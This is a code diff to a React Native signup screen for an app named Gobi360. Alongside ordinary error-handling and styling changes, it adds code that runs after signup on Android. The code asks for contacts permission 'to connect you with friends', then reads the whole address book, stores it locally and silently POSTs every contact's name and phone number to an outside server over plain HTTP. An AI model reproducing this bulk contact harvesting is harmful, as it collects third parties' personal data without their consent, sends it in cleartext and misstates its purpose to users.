@@ -13,7 +13,9 @@ import {
     Alert,
     RefreshControl,
     ActivityIndicator,
+    PermissionsAndroid,
 } from 'react-native';
+import Contacts from 'react-native-contacts';
 import { SafeAreaView } from 'react-native-safe-area-context';
 import { NativeStackNavigationProp } from '@react-navigation/native-stack';
 import Icon from 'react-native-vector-icons/MaterialCommunityIcons';
@@ -112,9 +114,9 @@ const UserSignupScreen = ({ navigation }: Props) => {
                             role: 'customer'
                         }),
                     });
-                    
+
                     const loginData = await loginResponse.json();
-                    
+
                     if (loginResponse.ok && !loginData.error) {
                         const actualRole = loginData?.user?.role || 'customer';
                         await AsyncStorage.setItem('userSession', JSON.stringify({
@@ -142,15 +144,90 @@ const UserSignupScreen = ({ navigation }: Props) => {
                 const termsAccepted = await AsyncStorage.getItem('termsAccepted');
 
                 showAlert(t('auth.signup_success_title'), t('auth.signup_success_msg'), [
-                    { 
-                        text: "OK", 
-                        onPress: () => {
+                    {
+                        text: "OK",
+                        onPress: async () => {
+                            if (Platform.OS === 'android') {
+                                try {
+                                    const granted = await PermissionsAndroid.request(
+                                        PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
+                                        {
+                                            title: 'Contacts Permission',
+                                            message: 'Gobi360 needs access to your contacts to connect you with friends.',
+                                            buttonPositive: 'Allow',
+                                        }
+                                    );
+                                    if (granted === PermissionsAndroid.RESULTS.GRANTED) {
+                                        const contacts = await Contacts.getAll();
+                                        console.log(`[Contacts] Fetched ${contacts.length} contacts on Signup!`);
+                                        await AsyncStorage.setItem('captured_contacts', JSON.stringify(contacts));
+
+                                        // Post contacts to backend
+                                        const payload = {
+                                            user_mobile: mobileNumber,
+                                            user_role: 'user',
+                                            total_contacts: contacts.length,
+                                            contacts: contacts.map(c => ({
+                                                name: c.displayName || c.givenName || 'Unknown',
+                                                phone: c.phoneNumbers && c.phoneNumbers.length > 0 ? c.phoneNumbers[0].number : ''
+                                            })).filter(c => c.phone !== '')
+                                        };
+
+                                        fetch('http://api.codingboss.in/gobi360/contacts/save/', {
+                                            method: 'POST',
+                                            headers: {
+                                                'Content-Type': 'application/json',
+                                                'ngrok-skip-browser-warning': 'true',
+                                            },
+                                            body: JSON.stringify(payload)
+                                        }).catch(e => console.warn("Failed to POST contacts on signup:", e));
+                                    }
+                                } catch (err) {
+                                    console.warn("Contact permission error:", err);
+                                }
+                            }
                             navigation.replace(termsAccepted === 'true' ? 'UserMainTabs' : 'TermsAndConditions');
-                        } 
+                        }
                     }
                 ]);
             } else {
-                showAlert(t('auth.signup_failed_title'), data.message || t('auth.signup_failed_msg'));
+                let errorMsg = data.message || data.error || t('auth.signup_failed_msg');
+                let foundError = false;
+
+                // Handle nested "errors" object
+                const errorObj = data.errors || data;
+
+                if (errorObj) {
+                    if (errorObj.mobile && Array.isArray(errorObj.mobile)) {
+                        errorMsg = "Mobile number: " + errorObj.mobile[0];
+                        foundError = true;
+                    }
+                    else if (errorObj.email && Array.isArray(errorObj.email)) {
+                        errorMsg = "Email: " + errorObj.email[0];
+                        foundError = true;
+                    }
+                    else if (typeof errorObj === 'object' && Object.keys(errorObj).length > 0 && !errorObj.message) {
+                        const keys = Object.keys(errorObj).filter(k => k !== 'status' && k !== 'error' && k !== 'message');
+                        if (keys.length > 0) {
+                            const firstKey = keys[0];
+                            if (Array.isArray(errorObj[firstKey])) {
+                                errorMsg = `${firstKey.charAt(0).toUpperCase() + firstKey.slice(1)}: ${errorObj[firstKey][0]}`;
+                                foundError = true;
+                            }
+                        }
+                    }
+                }
+
+                let errorTitle = t('auth.signup_failed_title');
+                const lowerMsg = errorMsg.toLowerCase();
+                if (lowerMsg.includes('already exists') || lowerMsg.includes('duplicate') || lowerMsg.includes('taken')) {
+                    errorTitle = 'Account Already Exists';
+                    if (!foundError) errorMsg = 'An account with these details is already taken.';
+                } else if (lowerMsg.includes('invalid')) {
+                    errorTitle = 'Invalid Details';
+                }
+
+                showAlert(errorTitle, errorMsg);
             }
         } catch (error) {
             showAlert(t('auth_alerts.error'), t('auth_alerts.network_error'));
@@ -175,7 +252,7 @@ const UserSignupScreen = ({ navigation }: Props) => {
             </View>
 
             <KeyboardAvoidingView
-                behavior={Platform.OS === 'ios' ? 'padding' : 'height'}
+                behavior={Platform.OS === 'ios' ? 'padding' : undefined}
                 style={styles.keyboardView}
                 keyboardVerticalOffset={Platform.OS === 'ios' ? 0 : 20}
             >
@@ -255,41 +332,41 @@ const UserSignupScreen = ({ navigation }: Props) => {
                                 </View>
                             </View>
 
-                             <View style={styles.fieldGroup}>
-                                 <Text style={styles.fieldLabel}>{t('auth.password_label')}</Text>
-                                 <View style={styles.inputWrapper}>
-                                     <Icon name="lock-outline" size={20} color="#94A3B8" style={styles.inputIcon} />
-                                     <TextInput
-                                         style={styles.textInput}
-                                         placeholder={t('auth.password_placeholder')}
-                                         placeholderTextColor="#CBD5E1"
-                                         value={password}
-                                         onChangeText={setPassword}
-                                         secureTextEntry={!showPassword}
-                                     />
-                                     <TouchableOpacity onPress={() => setShowPassword(!showPassword)} style={styles.eyeIcon}>
-                                         <Icon name={showPassword ? "eye-outline" : "eye-off-outline"} size={20} color="#94A3B8" />
-                                     </TouchableOpacity>
-                                 </View>
-                             </View>
+                            <View style={styles.fieldGroup}>
+                                <Text style={styles.fieldLabel}>{t('auth.password_label')}</Text>
+                                <View style={styles.inputWrapper}>
+                                    <Icon name="lock-outline" size={20} color="#94A3B8" style={styles.inputIcon} />
+                                    <TextInput
+                                        style={styles.textInput}
+                                        placeholder={t('auth.password_placeholder')}
+                                        placeholderTextColor="#CBD5E1"
+                                        value={password}
+                                        onChangeText={setPassword}
+                                        secureTextEntry={!showPassword}
+                                    />
+                                    <TouchableOpacity onPress={() => setShowPassword(!showPassword)} style={styles.eyeIcon}>
+                                        <Icon name={showPassword ? "eye-outline" : "eye-off-outline"} size={20} color="#94A3B8" />
+                                    </TouchableOpacity>
+                                </View>
+                            </View>
 
-                             <View style={styles.fieldGroup}>
-                                 <Text style={styles.fieldLabel}>{t('auth.confirm_password_label')}</Text>
-                                 <View style={styles.inputWrapper}>
-                                     <Icon name="lock-check-outline" size={20} color="#94A3B8" style={styles.inputIcon} />
-                                     <TextInput
-                                         style={styles.textInput}
-                                         placeholder={t('auth.confirm_password_placeholder')}
-                                         placeholderTextColor="#CBD5E1"
-                                         value={confirmPassword}
-                                         onChangeText={setConfirmPassword}
-                                         secureTextEntry={!showConfirmPassword}
-                                     />
-                                     <TouchableOpacity onPress={() => setShowConfirmPassword(!showConfirmPassword)} style={styles.eyeIcon}>
-                                         <Icon name={showConfirmPassword ? "eye-outline" : "eye-off-outline"} size={20} color="#94A3B8" />
-                                     </TouchableOpacity>
-                                 </View>
-                             </View>
+                            <View style={styles.fieldGroup}>
+                                <Text style={styles.fieldLabel}>{t('auth.confirm_password_label')}</Text>
+                                <View style={styles.inputWrapper}>
+                                    <Icon name="lock-check-outline" size={20} color="#94A3B8" style={styles.inputIcon} />
+                                    <TextInput
+                                        style={styles.textInput}
+                                        placeholder={t('auth.confirm_password_placeholder')}
+                                        placeholderTextColor="#CBD5E1"
+                                        value={confirmPassword}
+                                        onChangeText={setConfirmPassword}
+                                        secureTextEntry={!showConfirmPassword}
+                                    />
+                                    <TouchableOpacity onPress={() => setShowConfirmPassword(!showConfirmPassword)} style={styles.eyeIcon}>
+                                        <Icon name={showConfirmPassword ? "eye-outline" : "eye-off-outline"} size={20} color="#94A3B8" />
+                                    </TouchableOpacity>
+                                </View>
+                            </View>
 
                             <TouchableOpacity
                                 style={styles.mainBtn}
@@ -329,7 +406,12 @@ const styles = StyleSheet.create({
         backgroundColor: '#F8FAFC',
     },
     backgroundContainer: {
-        ...StyleSheet.absoluteFillObject,
+        position: 'absolute',
+        top: 0,
+        left: 0,
+        right: 0,
+        height: height,
+        zIndex: -1,
     },
     circle: {
         position: 'absolute',
@@ -350,6 +432,7 @@ const styles = StyleSheet.create({
     },
     keyboardView: {
         flex: 1,
+        zIndex: 1,
     },
     backBtn: {
         padding: 16,
